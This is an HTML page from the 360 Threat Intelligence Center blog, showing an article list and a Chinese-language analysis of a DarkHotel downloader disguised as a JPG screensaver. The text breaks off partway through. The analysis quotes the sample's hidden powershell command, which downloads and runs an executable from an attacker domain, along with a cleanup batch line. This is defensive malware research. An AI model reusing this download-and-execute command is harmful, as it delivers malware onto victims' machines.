<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.863edfce59f0a00ce608.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2df9fec90221d3916af4.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.a78c0d1fcdf1a526e7b5.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.f39815f9942bae29e5fd.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.7f40b4df92fe73eb8bcb.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 553d0417:0 ba3a09e0:0 ad307d5e:0 2e5c82ca:0 5dc9682e:0 01cb4693:0 69b5e360:0 ec18e8da:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;text-align:center;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.container[data-v-6f26dfdd]{margin:0 auto;max-width:1450px}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{display:inline-block;margin:16px;float:right}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.disPic[data-v-94c37b20]{background:url(/_nuxt/img/banner2.87c117d.jpg);background-repeat:no-repeat;background-size:cover;height:480px}.disPic .text[data-v-94c37b20]{color:#fff;text-align:center}.disPic .line1[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:700;font-size:60px;padding-top:142px}.disPic .line2[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:400;margin-top:46px;font-size:30px}.disPic .line3[data-v-94c37b20]{margin-top:51px;font-size:20px;font-family:LilyUPC;white-space:pre}.left-con[data-v-a7c4b6ea]{height:100%;width:100%;float:left}.main-part[data-v-a7c4b6ea]{margin-right:348px}.art-list[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 20px auto 108px}.paging[data-v-a7c4b6ea]{padding-bottom:20px;border-bottom:1px solid #efefef}.paging .pag-btn[data-v-a7c4b6ea]{line-height:40px;height:40px;color:#53addd;text-align:center;width:180px;border:1px solid #53addd;border-radius:2px;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-size:14px}.paging .pag-btn .ico[data-v-a7c4b6ea]{width:14px;height:14px;padding-top:13px;display:inline-block;background-size:14px;background-repeat:no-repeat}.paging .pag-btn p[data-v-a7c4b6ea]{display:inline-block}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover,.paging .pag-btn[data-v-a7c4b6ea]:active,.paging .pag-btn[data-v-a7c4b6ea]:hover{color:#fff}.paging .pag-btn[data-v-a7c4b6ea]:hover{background-color:#72c4f0;border-bottom:1px solid #72c4f0}.paging .pag-btn[data-v-a7c4b6ea]:active{background-color:#409ed0}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover{background-color:#dadee5;border:1px solid #dadee5;cursor:not-allowed}.paging .left[data-v-a7c4b6ea]{float:left}.paging .left p[data-v-a7c4b6ea]{padding-left:7px}.paging .right[data-v-a7c4b6ea]{float:right}.paging .right p[data-v-a7c4b6ea]{padding-right:7px}.paging .mid[data-v-a7c4b6ea]{text-align:center;line-height:40px;height:40px;color:#979996;margin:auto 200px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default}@media screen and (min-width:550px) and (max-width:950px){.main-part .paging[data-v-a7c4b6ea],.main-part[data-v-a7c4b6ea]{margin-right:108px}.main-part .paging .left[data-v-a7c4b6ea],.main-part .paging .right[data-v-a7c4b6ea]{width:25%}.main-part .paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}@media screen and (min-width:200px) and (max-width:550px){.main-part[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 40px}.main-part .art-list[data-v-a7c4b6ea],.paging .art-list[data-v-a7c4b6ea]{margin:0}.paging .left[data-v-a7c4b6ea],.paging .right[data-v-a7c4b6ea]{width:25%}.paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}.art-container[data-v-4113267b]{margin-top:16px;padding-bottom:16px;width:100%;height:216px;position:relative;border-bottom:1px solid #deded7}.art-container .text-box[data-v-4113267b]{margin-left:320px;top:0}.art-container .text-box .brief[data-v-4113267b]{text-indent:25px;display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden}.art-container .text-box .href[data-v-4113267b]{cursor:pointer;color:#53addd;text-indent:25px}.art-container .text-box .author[data-v-4113267b]{display:inline-block;line-height:32px}.art-container .text-box .author img[data-v-4113267b]{width:16px;height:16px}.art-container .pic-box[data-v-4113267b]{width:300px;max-height:200px;border-radius:5px;position:absolute;display:inline-block;top:0;overflow:hidden}.art-container .pic-box img[data-v-4113267b]{width:100%}@media screen and (min-width:950px) and (max-width:1250px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}@media screen and (min-width:200px) and (max-width:950px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}.tag[data-v-83f11450]{width:220px;float:left;margin-top:50px;margin-left:-311px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.tag .tag-header[data-v-83f11450]{cursor:pointer;height:40px;line-height:40px;text-align:center;font-size:15px;color:#494b48;font-weight:700;font-family:monospace}.tag .tag-header .tag-header[data-v-83f11450]{width:110px;height:40px;border:1px solid #efefef;background-color:#fafafa}.tag .tag-header .tag-header[data-v-83f11450]:hover{background-color:#66bcff;color:#fff;border:1px solid #66bcff}.tag .tag-header .h-chosen[data-v-83f11450]{color:#fff;background-color:#47afff;border:1px solid #47afff}.tag .tag-header .h-left[data-v-83f11450]{float:left}.tag .tag-header .h-right[data-v-83f11450]{overflow:hidden}.tag .tag-body[data-v-83f11450]{border:1px solid #efefef;border-bottom-left-radius:1px;border-bottom-right-radius:1px}.tag .tag-body .tag-list[data-v-83f11450]{padding:10px;margin-bottom:0;cursor:pointer}.tag .tag-body .tag-list .tag-item[data-v-83f11450]{padding:2px 8px;color:#0b1802;font-size:13px;list-style:none}.tag .tag-body .tag-list .tag-item a[data-v-83f11450]{padding:4px;border-radius:2px;display:inline-block}.tag .tag-body .tag-list .item-chosen a[data-v-83f11450]{color:#fff;background-color:#53addd}.tag .tag-body .tag-list .tag-item:hover a[data-v-83f11450]{color:#fff;background-color:#72c4f0}@media screen and (min-width:550px) and (max-width:950px){.tag[data-v-83f11450]{visibility:hidden}}@media screen and (max-width:550px){.tag[data-v-83f11450]{visibility:hidden}}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section data-v-6f26dfdd><div data-v-42857612 data-v-6f26dfdd><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><a href="/" data-v-42857612><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABYklEQVRYR+2Vy1HDMBCGV5sG0oLH3EkHkA78CHUAHdABtMCZyHEHdgnmHo8pIQ1kxcgTh+DRY20fAjPWTaOV/s//PizgyktcWR9mgP/rQLRrlkj0qGuIEN/zOPgaU0+jHIh2zQqJCgGw1KIK4ECI6zwOqqEQgwH64p3gWIhBADbxKRBsgFPOm852m9VDnWABaPHFkQoQsOLk+AQR5HFw8MV7AYaKnwUVVMdFW5hOCCfAaPGfovBCWAEmizMhrACJrCsBcOvLIevckQ4jQCLrJwHwynqcGaQAnrM0fOuH/00ATbn5aO7bMYtUMD/SGCYI1/pg+xCUpgBvG6ayVqaLCuATQJ1bTIC4M8XJNHRqjAboP2wDnQFmByY7kMh9aapwThHqTsnS0PkH9XfBdh+BELt+i3EAQKlYbm5y1xzxAnRDiZDawdStLA1fLveJrH/tkbC0DZ/LeyyAKZPQd3cGmB34BjX7xSHXvTXWAAAAAElFTkSuQmCC" class="ico-home" data-v-42857612></a></div><div class="disPic" data-v-42857612 data-v-94c37b20><p class="text line1" data-v-94c37b20>数据驱动安全<p class="text line2" data-v-94c37b20>360威胁情报研究<p class="text line3" data-v-94c37b20>———————— T H R E A T I N T E L L I G E N C E B A S E D O N D A T A A N D A N A L Y S I S ————————</div></div><div class="container" data-v-6f26dfdd><div class="left-con" data-v-a7c4b6ea data-v-6f26dfdd><div class="main-part" data-v-a7c4b6ea><div class="art-list" data-v-a7c4b6ea><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="/_nuxt/img/pic-1.3c14cf9.jpg" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/darkhotel-targeted-attack-sample-analysis" tag="div" data-v-552f8598>DarkHotel定向攻击样本分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>DARKHOTEL<p class="tag" data-v-53a17526>APT</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-05-13 , admin ,专题报告</div><div class="brief" data-v-4113267b>360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。 <a href="/articles/darkhotel-targeted-attack-sample-analysis" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/0e275715b71ac1ebf7c79054513124a2.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/level-of-threat-intelligence" tag="div" data-v-552f8598>威胁情报的层次分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b></div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-04-22 , admin ,安全观点</div><div class="brief" data-v-4113267b>威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。 <a href="/articles/level-of-threat-intelligence" class="href" data-v-4113267b>阅读全文</a></div></div></div></div><div class="paging" data-v-a7c4b6ea><a href="/" class="left pag-btn btn-unable" data-v-a7c4b6ea>上一页 </a><a href="/pages/1" class="right pag-btn btn-unable" data-v-a7c4b6ea>下一页</a><div class="mid" data-v-a7c4b6ea>第 1/1 页</div></div></div></div><div class="tag" data-v-83f11450 data-v-6f26dfdd><div class="tag-header" data-v-83f11450><div class="tag-header h-left h-chosen" data-v-83f11450>标签</div><div class="tag-header h-right" data-v-83f11450>类别</div></div><div class="tag-body" data-v-83f11450><ul class="tag-list" data-v-83f11450><li class="tag-item item-chosen" data-v-83f11450><a data-v-83f11450>全部</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>APT</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云3</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>海莲花</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OCEANLOTUS</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKCLOUD</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKHOTEL</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PAKISTAN</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>ADWARE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PETYA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>CVE-2014-6352</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OFFICE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>GAZA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DOCX</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>MBR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>HWORM</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>TEMPLATE INJECTION</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIN7</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>BACKDOOR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIREBALL</a></li><!----><!----><!----></ul></div></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{tagAllList:[[{tag:"全部"},{title:["Gaza Cybergang APT团伙新样本分析","FIN7 APT组织攻击木马分析报告","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面"],articleId:["597733a71c670a09e493ee37","597733a71c670a09e493ee3a","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c"],count:5,tag:"APT"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云3"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"海莲花"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"oceanlotus"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"DarkCloud"},{title:["DarkHotel定向攻击样本分析"],articleId:["597733a71c670a09e493ee3e"],count:1,tag:"DarkHotel"},{title:["针对巴基斯坦的某APT活动事件分析"],articleId:["597733a71c670a09e493ee3d"],count:1,tag:"Pakistan"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"adware"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"petya"},{title:["CVE-2014-6352漏洞及定向攻击样本分析"],articleId:["596f0ad74337d4596e59ed0b"],count:1,tag:"CVE-2014-6352"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"Office"},{title:["Gaza Cybergang APT团伙新样本分析"],articleId:["597733a71c670a09e493ee37"],count:1,tag:"gaza"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"docx"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"mbr"},{title:["H-WORM：简单而活跃的远控木马"],articleId:["597733a71c670a09e493ee39"],count:1,tag:"HWorm"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"template injection"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Fin7"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Backdoor"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"FireBall"}],[{category:"全部"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁","CVE-2014-6352漏洞及定向攻击样本分析","Gaza Cybergang APT团伙新样本分析","H-WORM：简单而活跃的远控木马","FIN7 APT组织攻击木马分析报告","浏览器变造者流氓推广软件分析","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面","暗云III木马技术分析报告","Petya变种勒索蠕虫启动代码分析"],articleId:["5968a01f5704074e282bcdde","596f0ad74337d4596e59ed0b","597733a71c670a09e493ee37","597733a71c670a09e493ee39","597733a71c670a09e493ee3a","597733a71c670a09e493ee3b","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c","597733a71c670a09e493ee3f","597733a71c670a09e493ee40"],count:11,category:"专题报告"},{title:["威胁情报的层次分析"],articleId:["597733a71c670a09e493ee38"],count:1,category:"安全观点"}],{success:!0,msg:[{_id:"597733a71c670a09e493ee3e",title:"DarkHotel定向攻击样本分析",author:"admin",content:'<h2 class="line" data-line="0">引言</h2>\n<p class="line" data-line="2">人在做，天在看。</p>\n<p class="line" data-line="4">360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。</p>\n<p class="text-center line" data-line="6"><img src="/uploads/2017/07/25/b94e98a75d80901569781b7706c462a3.png" alt="" width="90%"></p>\n<p class="line" data-line="8">DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。</p>\n<h2 class="line" data-line="10">样本分析</h2>\n<h3 class="line" data-line="12">基本信息</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>样本MD5</strong></td>\n<td>43f3b56c1c01b007c35197c703e4d6a6</td>\n</tr>\n<tr>\n<td><strong>样本大小</strong></td>\n<td>131,072 Bytes</td>\n</tr>\n<tr>\n<td><strong>编译时间</strong></td>\n<td>2015-10-15  22:52:30</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DSC3013.JPG.scr</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="23">样本截图：</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/00bdf6b50ed64629185aa0f4c0af9b49.png" alt="" width="90%"></p>\n<h3 class="line" data-line="27">详细行为</h3>\n<p class="line" data-line="29">总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从<code>http://all-microsoft-control.com/kd/f.exe</code>下载PE并执行。</p>\n<p class="line" data-line="31">样本首先会获取TEMP目录的路径：</p>\n<p class="text-center line" data-line="33"><img src="/uploads/2017/07/25/115b3d5f8c7da4f3b907e8ac19dd4104.png" alt=""></p>\n<p class="line" data-line="35">然后拼出4个路径：</p>\n<ul>\n<li>\n<p>%temp%\\DSC3013.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3014.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3015.JPG</p>\n</li>\n<li>\n<p>%temp%\\desktop.lnk</p>\n</li>\n</ul>\n<p class="text-center line" data-line="45"><img src="/uploads/2017/07/25/6069b840d7398d5f48154c2d40cac2ae.png" alt="" width="90%"></p>\n<p class="line" data-line="47">会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/25/0bbb522a245a8fbbc734d4a54a8535ba.png" alt="" width="90%"></p>\n<p class="line" data-line="51">数据为JPG图片格式文件，如图：</p>\n<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/acba031979dbc593e8dc49992c70318a.png" alt="" width="90%"></p>\n<p class="line" data-line="55">图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。</p>\n<p class="text-center line" data-line="57"><img src="/uploads/2017/07/25/8569fdab5bafba66d82202502ae7230c.png" alt="" width="90%"></p>\n<p class="line" data-line="59">数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/fdcc62d03d69a9d1484e7505198ed139.png" alt="" width="90%"></p>\n<p class="line" data-line="63">之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:</p>\n<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/61dfbe5f493472fca4433423ce0868ed.png" alt="" width="90%"></p>\n<p class="line" data-line="67">接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：</p>\n<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/45f814441f410f839b2add1ffde8d73f.png" alt="" width="90%"></p>\n<p class="line" data-line="71">然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：</p>\n<p class="text-center line" data-line="73"><img src="/uploads/2017/07/25/767b77b1e45f1b449a46e065cdcff29b.png" alt="" width="90%"></p>\n<p class="line" data-line="75">文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：</p>\n<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/8517464a5af5bdb701d80b6453373bf9.png" alt="" width="90%"></p>\n<p class="line" data-line="79">把该块数据段保存成LNK文件，命令行参数如下：</p>\n<p class="text-center line" data-line="81"><img src="/uploads/2017/07/25/928be2ad6fc6d2623f0d6a4c16b4350b.png" alt=""></p>\n<p class="line" data-line="83">快捷方式指向的目标为：</p>\n<pre class="hljs"><code class="hljs">%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://all-microsoft-control.com/kd/f.exe \',\'%temp%\\~$ER96F\\.doc\')&&echo f|xcopy %temp%\\~$ER96F.doc %temp%\\dwm.exe /H /Y&&%temp%\\dwm.exe\n</code></pre>\n<p class="line" data-line="89">所以快捷方式被执行起来后，会调用powershell从http://all-microsoft-control.com/kd/f.exe下载到%temp%\\~$ER96F.doc，并把该文件重命名为dwm.exe后，运行起来。</p>\n<p class="line" data-line="91">最后会在同目录下生成desktop.bat，并把“del *.scr\\r\\ndel *.bat”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。</p>\n<p class="text-center line" data-line="93"><img src="/uploads/2017/07/25/f480320173f2d9f1716f6eb576e37ff1.png" alt="" width="90%"></p>\n<h3 class="line" data-line="95">远控木马</h3>\n<p class="line" 